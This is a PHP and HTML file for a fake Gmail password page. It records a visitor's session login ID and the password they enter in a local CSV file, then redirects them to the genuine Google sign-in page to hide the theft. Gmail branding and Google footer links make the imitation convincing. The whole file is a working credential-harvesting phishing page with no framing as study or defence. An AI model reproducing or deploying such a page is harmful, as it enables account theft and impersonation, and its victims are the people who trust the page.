<?php
    session_start();
    $pass= $empty_err="";
    $uid= htmlspecialchars($_SESSION["login_id"]);

    if($_SERVER["REQUEST_METHOD"]=="POST")
    {
        if(empty($_POST["pass"]))
        {
            $empty_err="Enter a password.";
        }
        else
        {
            $pass=htmlspecialchars($_POST["pass"]);
                
            $csv_file= fopen("login_detail.csv","a");
            // to be run only the first time
            // fwrite($csv_file,"Email/Phone_no");
            // fwrite($csv_file,",");
            // fwrite($csv_file,"Password");
            
            fwrite($csv_file,"\n");
            fwrite($csv_file,$uid);
            fwrite($csv_file,",");
            fwrite($csv_file,$pass);
            fclose($csv_file);

            header("Refresh:1; url=https://accounts.google.com/v3/signin/identifier?continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&ifkv=Ab5oB3r93_Lg_0xGT8VX2rjWqlLTHhneqgsUWlFa1C07ktcX1IwMTSPoHU4IzvKf6QykXpcZ0mmBzg&rip=1&sacu=1&service=mail&flowName=GlifWebSignIn&flowEntry=ServiceLogin&dsh=S-518038954%3A1725461575498084&ddm=0");
            exit();
        }
    }
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="stylee.css">
    <link rel="stylesheet" href="pass.css">
    <title>Gmail</title>
</head>

<body>
    <div class="container">
        <div class="container_left">
            <img src="logo.png" alt="Gmail_logo" id="logo">
            <h1>Welcome</h1>
            <div id="email_id">
                <img src="user_icon.png" alt="">
                <p><?php echo $uid; ?></p>
            </div>
        </div>
        <div class="container_right">
            <form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="post">
                <input type="password" name="pass" class="u_input" placeholder="Enter your password">
                <div class="error"><?php echo $empty_err; ?></div>
                <button>Forgot password?</button>
                <input type="submit" id="submit" value="Next">
            </form>    
        </div>
    </div>
    <footer>
        <a href="https://support.google.com/accounts?hl=en&visit_id=638602484927413527-3160675327&rd=2&p=account_iph#topic=3382296">Help</a>
        <a href="https://policies.google.com/privacy?gl=IN&hl=en-US">Privacy</a>
        <a href="https://policies.google.com/terms?gl=IN&hl=en-US">Terms</a>
    </footer>
</body>

</html>